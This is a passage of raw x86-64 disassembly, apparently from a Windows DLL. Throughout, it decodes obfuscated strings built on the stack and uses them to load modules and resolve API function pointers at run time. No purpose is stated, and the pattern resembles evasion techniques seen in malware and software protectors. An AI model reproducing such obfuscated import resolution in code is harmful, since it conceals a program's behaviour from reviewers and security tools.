   180001726:	c7 44 24 54 41 00 2e 	movl   $0x2e0041,0x54(%rsp)
   18000172d:	00 
   18000172e:	f2 0f 10 4c 24 50    	movsd  0x50(%rsp),%xmm1
   180001734:	0f 11 85 68 02 00 00 	movups %xmm0,0x268(%rbp)
   18000173b:	48 89 85 90 02 00 00 	mov    %rax,0x290(%rbp)
   180001742:	f2 0f 11 8d 78 02 00 	movsd  %xmm1,0x278(%rbp)
   180001749:	00 
   18000174a:	e8 c1 cd 00 00       	call   0x18000e510
   18000174f:	48 8b c8             	mov    %rax,%rcx
   180001752:	ff 15 b8 49 02 00    	call   *0x249b8(%rip)        # 0x180026110
   180001758:	48 8b f8             	mov    %rax,%rdi
   18000175b:	48 85 c0             	test   %rax,%rax
   18000175e:	0f 84 6c 1b 00 00    	je     0x1800032d0
   180001764:	66 0f 6f 0d 54 38 3a 	movdqa 0x3a3854(%rip),%xmm1        # 0x1803a4fc0
   18000176b:	00 
   18000176c:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180001770:	33 c0                	xor    %eax,%eax
   180001772:	66 c7 44 24 50 56 34 	movw   $0x3456,0x50(%rsp)
   180001779:	89 44 24 52          	mov    %eax,0x52(%rsp)
   18000177d:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001780:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   180001785:	66 89 45 3a          	mov    %ax,0x3a(%rbp)
   180001789:	0f b7 44 24 50       	movzwl 0x50(%rsp),%eax
   18000178e:	66 89 45 28          	mov    %ax,0x28(%rbp)
   180001792:	0f 11 45 2a          	movups %xmm0,0x2a(%rbp)
   180001796:	0f 11 4d 18          	movups %xmm1,0x18(%rbp)
   18000179a:	e8 a1 ce 00 00       	call   0x18000e640
   18000179f:	48 8b d0             	mov    %rax,%rdx
   1800017a2:	48 8b cf             	mov    %rdi,%rcx
   1800017a5:	ff 15 85 49 02 00    	call   *0x24985(%rip)        # 0x180026130
   1800017ab:	48 89 05 ce 94 3a 00 	mov    %rax,0x3a94ce(%rip)        # 0x1803aac80
   1800017b2:	48 8b ce             	mov    %rsi,%rcx
   1800017b5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1800017bc:	00 00 00 00 
   1800017c0:	40 88 74 0d 2a       	mov    %sil,0x2a(%rbp,%rcx,1)
   1800017c5:	48 ff c1             	inc    %rcx
   1800017c8:	48 83 f9 12          	cmp    $0x12,%rcx
   1800017cc:	72 f2                	jb     0x1800017c0
   1800017ce:	48 85 c0             	test   %rax,%rax
   1800017d1:	0f 84 f9 1a 00 00    	je     0x1800032d0
   1800017d7:	33 c0                	xor    %eax,%eax
   1800017d9:	c7 85 08 02 00 00 4c 	movl   $0x48004c,0x208(%rbp)
   1800017e0:	00 48 00 
   1800017e3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800017e6:	89 85 8c 00 00 00    	mov    %eax,0x8c(%rbp)
   1800017ec:	48 8d 8d 08 02 00 00 	lea    0x208(%rbp),%rcx
   1800017f3:	89 85 2c 02 00 00    	mov    %eax,0x22c(%rbp)
   1800017f9:	0f 11 85 1c 02 00 00 	movups %xmm0,0x21c(%rbp)
   180001800:	c7 85 0c 02 00 00 40 	movl   $0x150040,0x20c(%rbp)
   180001807:	00 15 00 
   18000180a:	c7 85 10 02 00 00 15 	movl   $0x60015,0x210(%rbp)
   180001811:	00 06 00 
   180001814:	c7 85 14 02 00 00 4d 	movl   $0x46004d,0x214(%rbp)
   18000181b:	00 46 00 
   18000181e:	c7 85 18 02 00 00 47 	movl   $0x2c0047,0x218(%rbp)
   180001825:	00 2c 00 
   180001828:	e8 93 cc 00 00       	call   0x18000e4c0
   18000182d:	48 8b c8             	mov    %rax,%rcx
   180001830:	ff 15 da 48 02 00    	call   *0x248da(%rip)        # 0x180026110
   180001836:	48 8b f8             	mov    %rax,%rdi
   180001839:	48 85 c0             	test   %rax,%rax
   18000183c:	0f 84 68 1a 00 00    	je     0x1800032aa
   180001842:	66 0f 6f 0d 16 35 3a 	movdqa 0x3a3516(%rip),%xmm1        # 0x1803a4d60
   180001849:	00 
   18000184a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000184f:	33 c0                	xor    %eax,%eax
   180001851:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001855:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   18000185a:	83 cb 40             	or     $0x40,%ebx
   18000185d:	48 89 44 24 2f       	mov    %rax,0x2f(%rsp)
   180001862:	89 44 24 37          	mov    %eax,0x37(%rsp)
   180001866:	66 89 44 24 3b       	mov    %ax,0x3b(%rsp)
   18000186b:	88 44 24 3d          	mov    %al,0x3d(%rsp)
   18000186f:	66 0f 7e c8          	movd   %xmm1,%eax
   180001873:	88 44 24 20          	mov    %al,0x20(%rsp)
   180001877:	66 0f 7e c0          	movd   %xmm0,%eax
   18000187b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000187f:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180001884:	88 44 24 21          	mov    %al,0x21(%rsp)
   180001888:	66 0f 7e c0          	movd   %xmm0,%eax
   18000188c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001890:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180001895:	88 44 24 22          	mov    %al,0x22(%rsp)
   180001899:	66 0f 7e c0          	movd   %xmm0,%eax
   18000189d:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800018a1:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   1800018a6:	88 44 24 23          	mov    %al,0x23(%rsp)
   1800018aa:	66 0f 7e c0          	movd   %xmm0,%eax
   1800018ae:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800018b2:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   1800018b7:	88 44 24 24          	mov    %al,0x24(%rsp)
   1800018bb:	66 0f 7e c0          	movd   %xmm0,%eax
   1800018bf:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800018c3:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   1800018c8:	88 44 24 25          	mov    %al,0x25(%rsp)
   1800018cc:	66 0f 7e c0          	movd   %xmm0,%eax
   1800018d0:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800018d4:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   1800018d9:	88 44 24 26          	mov    %al,0x26(%rsp)
   1800018dd:	66 0f 7e c0          	movd   %xmm0,%eax
   1800018e1:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800018e5:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1800018ea:	88 44 24 27          	mov    %al,0x27(%rsp)
   1800018ee:	66 0f 7e c0          	movd   %xmm0,%eax
   1800018f2:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800018f6:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   1800018fb:	88 44 24 28          	mov    %al,0x28(%rsp)
   1800018ff:	66 0f 7e c0          	movd   %xmm0,%eax
   180001903:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001907:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   18000190c:	88 44 24 29          	mov    %al,0x29(%rsp)
   180001910:	66 0f 7e c0          	movd   %xmm0,%eax
   180001914:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001918:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   18000191d:	88 44 24 2a          	mov    %al,0x2a(%rsp)
   180001921:	66 0f 7e c0          	movd   %xmm0,%eax
   180001925:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001929:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   18000192e:	88 44 24 2b          	mov    %al,0x2b(%rsp)
   180001932:	66 0f 7e c0          	movd   %xmm0,%eax
   180001936:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000193a:	66 0f 73 d8 0d       	psrldq $0xd,%xmm0
   18000193f:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   180001944:	88 44 24 2c          	mov    %al,0x2c(%rsp)
   180001948:	66 0f 7e c0          	movd   %xmm0,%eax
   18000194c:	88 44 24 2d          	mov    %al,0x2d(%rsp)
   180001950:	66 0f 7e c8          	movd   %xmm1,%eax
   180001954:	88 44 24 2e          	mov    %al,0x2e(%rsp)
   180001958:	e8 13 cb 00 00       	call   0x18000e470
   18000195d:	48 8b d0             	mov    %rax,%rdx
   180001960:	48 8b cf             	mov    %rdi,%rcx
   180001963:	ff 15 c7 47 02 00    	call   *0x247c7(%rip)        # 0x180026130
   180001969:	48 89 05 a0 92 3a 00 	mov    %rax,0x3a92a0(%rip)        # 0x1803aac10
   180001970:	48 85 c0             	test   %rax,%rax
   180001973:	0f 84 38 01 00 00    	je     0x180001ab1
   180001979:	66 0f 6f 0d ef 33 3a 	movdqa 0x3a33ef(%rip),%xmm1        # 0x1803a4d70
   180001980:	00 
   180001981:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180001986:	33 c0                	xor    %eax,%eax
   180001988:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000198c:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180001991:	0f ba eb 07          	bts    $0x7,%ebx
   180001995:	48 89 44 24 6f       	mov    %rax,0x6f(%rsp)
   18000199a:	89 44 24 77          	mov    %eax,0x77(%rsp)
   18000199e:	66 89 44 24 7b       	mov    %ax,0x7b(%rsp)
   1800019a3:	88 44 24 7d          	mov    %al,0x7d(%rsp)
   1800019a7:	66 0f 7e c8          	movd   %xmm1,%eax
   1800019ab:	88 44 24 60          	mov    %al,0x60(%rsp)
   1800019af:	66 0f 7e c0          	movd   %xmm0,%eax
   1800019b3:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800019b7:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   1800019bc:	88 44 24 61          	mov    %al,0x61(%rsp)
   1800019c0:	66 0f 7e c0          	movd   %xmm0,%eax
   1800019c4:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800019c8:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   1800019cd:	88 44 24 62          	mov    %al,0x62(%rsp)
   1800019d1:	66 0f 7e c0          	movd   %xmm0,%eax
   1800019d5:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800019d9:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   1800019de:	88 44 24 63          	mov    %al,0x63(%rsp)
   1800019e2:	66 0f 7e c0          	movd   %xmm0,%eax
   1800019e6:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800019ea:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   1800019ef:	88 44 24 64          	mov    %al,0x64(%rsp)
   1800019f3:	66 0f 7e c0          	movd   %xmm0,%eax
   1800019f7:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800019fb:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180001a00:	88 44 24 65          	mov    %al,0x65(%rsp)
   180001a04:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a08:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001a0c:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180001a11:	88 44 24 66          	mov    %al,0x66(%rsp)
   180001a15:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a19:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001a1d:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180001a22:	88 44 24 67          	mov    %al,0x67(%rsp)
   180001a26:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a2a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001a2e:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180001a33:	88 44 24 68          	mov    %al,0x68(%rsp)
   180001a37:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a3b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001a3f:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180001a44:	88 44 24 69          	mov    %al,0x69(%rsp)
   180001a48:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a4c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001a50:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180001a55:	88 44 24 6a          	mov    %al,0x6a(%rsp)
   180001a59:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a5d:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001a61:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   180001a66:	88 44 24 6b          	mov    %al,0x6b(%rsp)
   180001a6a:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a6e:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001a72:	66 0f 73 d8 0d       	psrldq $0xd,%xmm0
   180001a77:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   180001a7c:	88 44 24 6c          	mov    %al,0x6c(%rsp)
   180001a80:	66 0f 7e c0          	movd   %xmm0,%eax
   180001a84:	88 44 24 6d          	mov    %al,0x6d(%rsp)
   180001a88:	66 0f 7e c8          	movd   %xmm1,%eax
   180001a8c:	88 44 24 6e          	mov    %al,0x6e(%rsp)
   180001a90:	e8 db c9 00 00       	call   0x18000e470
   180001a95:	48 8b d0             	mov    %rax,%rdx
   180001a98:	48 8b cf             	mov    %rdi,%rcx
   180001a9b:	ff 15 8f 46 02 00    	call   *0x2468f(%rip)        # 0x180026130
   180001aa1:	48 89 05 08 92 3a 00 	mov    %rax,0x3a9208(%rip)        # 0x1803aacb0
   180001aa8:	48 85 c0             	test   %rax,%rax
   180001aab:	74 04                	je     0x180001ab1
   180001aad:	32 c9                	xor    %cl,%cl
   180001aaf:	eb 02                	jmp    0x180001ab3
   180001ab1:	b1 01                	mov    $0x1,%cl
   180001ab3:	84 db                	test   %bl,%bl
   180001ab5:	79 17                	jns    0x180001ace
   180001ab7:	0f ba f3 07          	btr    $0x7,%ebx
   180001abb:	48 8b c6             	mov    %rsi,%rax
   180001abe:	66 90                	xchg   %ax,%ax
   180001ac0:	40 88 74 04 6f       	mov    %sil,0x6f(%rsp,%rax,1)
   180001ac5:	48 ff c0             	inc    %rax
   180001ac8:	48 83 f8 0f          	cmp    $0xf,%rax
   180001acc:	72 f2                	jb     0x180001ac0
   180001ace:	83 e3 bf             	and    $0xffffffbf,%ebx
   180001ad1:	48 8b c6             	mov    %rsi,%rax
   180001ad4:	0f 1f 40 00          	nopl   0x0(%rax)
   180001ad8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001adf:	00 
   180001ae0:	40 88 74 04 2f       	mov    %sil,0x2f(%rsp,%rax,1)
   180001ae5:	48 ff c0             	inc    %rax
   180001ae8:	48 83 f8 0f          	cmp    $0xf,%rax
   180001aec:	72 f2                	jb     0x180001ae0
   180001aee:	84 c9                	test   %cl,%cl
   180001af0:	0f 85 b4 17 00 00    	jne    0x1800032aa
   180001af6:	33 c0                	xor    %eax,%eax
   180001af8:	c7 45 c0 4c 00 48 00 	movl   $0x48004c,-0x40(%rbp)
   180001aff:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001b02:	c7 45 c4 40 00 47 00 	movl   $0x470040,-0x3c(%rbp)
   180001b09:	0f 11 85 4a 02 00 00 	movups %xmm0,0x24a(%rbp)
   180001b10:	b9 2f 00 00 00       	mov    $0x2f,%ecx
   180001b15:	c7 45 c8 52 00 5c 00 	movl   $0x5c0052,-0x38(%rbp)
   180001b1c:	66 89 8d 48 02 00 00 	mov    %cx,0x248(%rbp)
   180001b23:	48 8d 8d 30 02 00 00 	lea    0x230(%rbp),%rcx
   180001b2a:	c7 45 cc 1a 00 18 00 	movl   $0x18001a,-0x34(%rbp)
   180001b31:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   180001b35:	c7 45 d0 05 00 48 00 	movl   $0x480005,-0x30(%rbp)
   180001b3c:	c7 45 d4 41 00 42 00 	movl   $0x420041,-0x2c(%rbp)
   180001b43:	f2 0f 10 4d d0       	movsd  -0x30(%rbp),%xmm1
   180001b48:	0f 11 85 30 02 00 00 	movups %xmm0,0x230(%rbp)
   180001b4f:	89 45 da             	mov    %eax,-0x26(%rbp)
   180001b52:	66 89 45 de          	mov    %ax,-0x22(%rbp)
   180001b56:	48 89 85 5a 02 00 00 	mov    %rax,0x25a(%rbp)
   180001b5d:	66 89 85 62 02 00 00 	mov    %ax,0x262(%rbp)
   180001b64:	f2 0f 11 8d 40 02 00 	movsd  %xmm1,0x240(%rbp)
   180001b6b:	00 
   180001b6c:	e8 af c8 00 00       	call   0x18000e420
   180001b71:	48 8b c8             	mov    %rax,%rcx
   180001b74:	ff 15 96 45 02 00    	call   *0x24596(%rip)        # 0x180026110
   180001b7a:	48 8b f8             	mov    %rax,%rdi
   180001b7d:	48 85 c0             	test   %rax,%rax
   180001b80:	0f 84 ec 16 00 00    	je     0x180003272
   180001b86:	66 0f 6f 0d e2 32 3a 	movdqa 0x3a32e2(%rip),%xmm1        # 0x1803a4e70
   180001b8d:	00 
   180001b8e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001b92:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001b95:	0f ba eb 08          	bts    $0x8,%ebx
   180001b99:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   180001b9d:	0f 11 4d f0          	movups %xmm1,-0x10(%rbp)
   180001ba1:	e8 2a c8 00 00       	call   0x18000e3d0
   180001ba6:	48 8b d0             	mov    %rax,%rdx
   180001ba9:	48 8b cf             	mov    %rdi,%rcx
   180001bac:	ff 15 7e 45 02 00    	call   *0x2457e(%rip)        # 0x180026130
   180001bb2:	48 89 05 ff 90 3a 00 	mov    %rax,0x3a90ff(%rip)        # 0x1803aacb8
   180001bb9:	48 85 c0             	test   %rax,%rax
   180001bbc:	0f 84 2d 06 00 00    	je     0x1800021ef
   180001bc2:	66 0f 6f 0d 96 35 3a 	movdqa 0x3a3596(%rip),%xmm1        # 0x1803a5160
   180001bc9:	00 
   180001bca:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   180001bce:	33 c0                	xor    %eax,%eax
   180001bd0:	c7 44 24 50 56 57 41 	movl   $0x59415756,0x50(%rsp)
   180001bd7:	59 
   180001bd8:	89 45 66             	mov    %eax,0x66(%rbp)
   180001bdb:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001bde:	66 89 45 6a          	mov    %ax,0x6a(%rbp)
   180001be2:	0f ba eb 09          	bts    $0x9,%ebx
   180001be6:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180001bea:	89 45 50             	mov    %eax,0x50(%rbp)
   180001bed:	c7 44 24 54 45 38 00 	movl   $0x3845,0x54(%rsp)
   180001bf4:	00 
   180001bf5:	0f b7 44 24 54       	movzwl 0x54(%rsp),%eax
   180001bfa:	66 89 45 54          	mov    %ax,0x54(%rbp)
   180001bfe:	0f 11 45 56          	movups %xmm0,0x56(%rbp)
   180001c02:	0f 11 4d 40          	movups %xmm1,0x40(%rbp)
   180001c06:	e8 95 c7 00 00       	call   0x18000e3a0
   180001c0b:	48 8b d0             	mov    %rax,%rdx
   180001c0e:	48 8b cf             	mov    %rdi,%rcx
   180001c11:	ff 15 19 45 02 00    	call   *0x24519(%rip)        # 0x180026130
   180001c17:	48 89 05 2a 90 3a 00 	mov    %rax,0x3a902a(%rip)        # 0x1803aac48
   180001c1e:	48 85 c0             	test   %rax,%rax
   180001c21:	0f 84 c8 05 00 00    	je     0x1800021ef
   180001c27:	66 0f 6f 0d 51 35 3a 	movdqa 0x3a3551(%rip),%xmm1        # 0x1803a5180
   180001c2e:	00 
   180001c2f:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180001c33:	33 c0                	xor    %eax,%eax
   180001c35:	48 c7 44 24 50 52 40 	movq   $0x36544052,0x50(%rsp)
   180001c3c:	54 36 
   180001c3e:	89 45 3c             	mov    %eax,0x3c(%rbp)
   180001c41:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001c44:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180001c48:	0f ba eb 0a          	bts    $0xa,%ebx
   180001c4c:	89 45 28             	mov    %eax,0x28(%rbp)
   180001c4f:	0f 11 45 2c          	movups %xmm0,0x2c(%rbp)
   180001c53:	0f 11 4d 18          	movups %xmm1,0x18(%rbp)
   180001c57:	e8 14 c7 00 00       	call   0x18000e370
   180001c5c:	48 8b d0             	mov    %rax,%rdx
   180001c5f:	48 8b cf             	mov    %rdi,%rcx
   180001c62:	ff 15 c8 44 02 00    	call   *0x244c8(%rip)        # 0x180026130
   180001c68:	48 89 05 c1 8f 3a 00 	mov    %rax,0x3a8fc1(%rip)        # 0x1803aac30
   180001c6f:	48 85 c0             	test   %rax,%rax
   180001c72:	0f 84 77 05 00 00    	je     0x1800021ef
   180001c78:	66 0f 6f 0d 60 32 3a 	movdqa 0x3a3260(%rip),%xmm1        # 0x1803a4ee0
   180001c7f:	00 
   180001c80:	48 8d 8d f8 00 00 00 	lea    0xf8(%rbp),%rcx
   180001c87:	33 c0                	xor    %eax,%eax
   180001c89:	c7 44 24 50 40 70 54 	movl   $0x42547040,0x50(%rsp)
   180001c90:	42 
   180001c91:	89 85 1e 01 00 00    	mov    %eax,0x11e(%rbp)
   180001c97:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001c9a:	66 89 85 22 01 00 00 	mov    %ax,0x122(%rbp)
   180001ca1:	0f ba eb 0b          	bts    $0xb,%ebx
   180001ca5:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180001ca9:	89 85 08 01 00 00    	mov    %eax,0x108(%rbp)
   180001caf:	c7 44 24 54 56 38 00 	movl   $0x3856,0x54(%rsp)
   180001cb6:	00 
   180001cb7:	0f b7 44 24 54       	movzwl 0x54(%rsp),%eax
   180001cbc:	66 89 85 0c 01 00 00 	mov    %ax,0x10c(%rbp)
   180001cc3:	0f 11 85 0e 01 00 00 	movups %xmm0,0x10e(%rbp)
   180001cca:	0f 11 8d f8 00 00 00 	movups %xmm1,0xf8(%rbp)
   180001cd1:	e8 ca c6 00 00       	call   0x18000e3a0
   180001cd6:	48 8b d0             	mov    %rax,%rdx
   180001cd9:	48 8b cf             	mov    %rdi,%rcx
   180001cdc:	ff 15 4e 44 02 00    	call   *0x2444e(%rip)        # 0x180026130
   180001ce2:	48 89 05 07 90 3a 00 	mov    %rax,0x3a9007(%rip)        # 0x1803aacf0
   180001ce9:	48 85 c0             	test   %rax,%rax
   180001cec:	0f 84 fd 04 00 00    	je     0x1800021ef
   180001cf2:	66 0f 6f 0d a6 32 3a 	movdqa 0x3a32a6(%rip),%xmm1        # 0x1803a4fa0
   180001cf9:	00 
   180001cfa:	48 8d 8d 98 00 00 00 	lea    0x98(%rbp),%rcx
   180001d01:	33 c0                	xor    %eax,%eax
   180001d03:	c6 85 a8 00 00 00 33 	movb   $0x33,0xa8(%rbp)
   180001d0a:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001d0d:	89 85 89 00 00 00    	mov    %eax,0x89(%rbp)
   180001d13:	66 89 85 8d 00 00 00 	mov    %ax,0x8d(%rbp)
   180001d1a:	0f ba eb 0c          	bts    $0xc,%ebx
   180001d1e:	88 85 8f 00 00 00    	mov    %al,0x8f(%rbp)
   180001d24:	0f 11 85 a9 00 00 00 	movups %xmm0,0xa9(%rbp)
   180001d2b:	88 85 b9 00 00 00    	mov    %al,0xb9(%rbp)
   180001d31:	0f 11 8d 98 00 00 00 	movups %xmm1,0x98(%rbp)
   180001d38:	e8 53 c8 00 00       	call   0x18000e590
   180001d3d:	48 8b d0             	mov    %rax,%rdx
   180001d40:	48 8b cf             	mov    %rdi,%rcx
   180001d43:	ff 15 e7 43 02 00    	call   *0x243e7(%rip)        # 0x180026130
   180001d49:	48 89 05 c0 8f 3a 00 	mov    %rax,0x3a8fc0(%rip)        # 0x1803aad10
   180001d50:	48 85 c0             	test   %rax,%rax
   180001d53:	0f 84 96 04 00 00    	je     0x1800021ef
   180001d59:	66 0f 6f 0d df 33 3a 	movdqa 0x3a33df(%rip),%xmm1        # 0x1803a5140
   180001d60:	00 
   180001d61:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180001d65:	33 c0                	xor    %eax,%eax
   180001d67:	48 c7 44 24 50 56 5a 	movq   $0x36415a56,0x50(%rsp)
   180001d6e:	41 36 
   180001d70:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   180001d73:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001d76:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180001d7a:	0f ba eb 0d          	bts    $0xd,%ebx
   180001d7e:	89 45 d0             	mov    %eax,-0x30(%rbp)
   180001d81:	0f 11 45 d4          	movups %xmm0,-0x2c(%rbp)
   180001d85:	0f 11 4d c0          	movups %xmm1,-0x40(%rbp)
   180001d89:	e8 e2 c5 00 00       	call   0x18000e370
   180001d8e:	48 8b d0             	mov    %rax,%rdx
   180001d91:	48 8b cf             	mov    %rdi,%rcx
   180001d94:	ff 15 96 43 02 00    	call   *0x24396(%rip)        # 0x180026130
   180001d9a:	48 89 05 3f 8f 3a 00 	mov    %rax,0x3a8f3f(%rip)        # 0x1803aace0
   180001da1:	48 85 c0             	test   %rax,%rax
   180001da4:	0f 84 45 04 00 00    	je     0x1800021ef
   180001daa:	66 0f 6f 0d de 2d 3a 	movdqa 0x3a2dde(%rip),%xmm1        # 0x1803a4b90
   180001db1:	00 
   180001db2:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180001db6:	33 c0                	xor    %eax,%eax
   180001db8:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001dbc:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180001dc1:	0f ba eb 0e          	bts    $0xe,%ebx
   180001dc5:	48 89 45 8c          	mov    %rax,-0x74(%rbp)
   180001dc9:	89 45 94             	mov    %eax,-0x6c(%rbp)
   180001dcc:	66 0f 7e c8          	movd   %xmm1,%eax
   180001dd0:	88 45 80             	mov    %al,-0x80(%rbp)
   180001dd3:	66 0f 7e c0          	movd   %xmm0,%eax
   180001dd7:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001ddb:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180001de0:	88 45 81             	mov    %al,-0x7f(%rbp)
   180001de3:	66 0f 7e c0          	movd   %xmm0,%eax
   180001de7:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001deb:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180001df0:	88 45 82             	mov    %al,-0x7e(%rbp)
   180001df3:	66 0f 7e c0          	movd   %xmm0,%eax
   180001df7:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001dfb:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180001e00:	88 45 83             	mov    %al,-0x7d(%rbp)
   180001e03:	66 0f 7e c0          	movd   %xmm0,%eax
   180001e07:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001e0b:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180001e10:	88 45 84             	mov    %al,-0x7c(%rbp)
   180001e13:	66 0f 7e c0          	movd   %xmm0,%eax
   180001e17:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001e1b:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180001e20:	88 45 85             	mov    %al,-0x7b(%rbp)
   180001e23:	66 0f 7e c0          	movd   %xmm0,%eax
   180001e27:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001e2b:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180001e30:	88 45 86             	mov    %al,-0x7a(%rbp)
   180001e33:	66 0f 7e c0          	movd   %xmm0,%eax
   180001e37:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001e3b:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180001e40:	88 45 87             	mov    %al,-0x79(%rbp)
   180001e43:	66 0f 7e c0          	movd   %xmm0,%eax
   180001e47:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001e4b:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180001e50:	88 45 88             	mov    %al,-0x78(%rbp)
   180001e53:	66 0f 7e c0          	movd   %xmm0,%eax
   180001e57:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001e5b:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180001e60:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   180001e65:	88 45 89             	mov    %al,-0x77(%rbp)
   180001e68:	66 0f 7e c0          	movd   %xmm0,%eax
   180001e6c:	88 45 8a             	mov    %al,-0x76(%rbp)
   180001e6f:	66 0f 7e c8          	movd   %xmm1,%eax
   180001e73:	88 45 8b             	mov    %al,-0x75(%rbp)
   180001e76:	e8 c5 c4 00 00       	call   0x18000e340
   180001e7b:	48 8b d0             	mov    %rax,%rdx
   180001e7e:	48 8b cf             	mov    %rdi,%rcx
   180001e81:	ff 15 a9 42 02 00    	call   *0x242a9(%rip)        # 0x180026130
   180001e87:	48 89 05 32 8e 3a 00 	mov    %rax,0x3a8e32(%rip)        # 0x1803aacc0
   180001e8e:	48 85 c0             	test   %rax,%rax
   180001e91:	0f 84 58 03 00 00    	je     0x1800021ef
   180001e97:	66 0f 6f 0d b1 2d 3a 	movdqa 0x3a2db1(%rip),%xmm1        # 0x1803a4c50
   180001e9e:	00 
   180001e9f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001ea4:	33 c0                	xor    %eax,%eax
   180001ea6:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001eaa:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180001eaf:	0f ba eb 0f          	bts    $0xf,%ebx
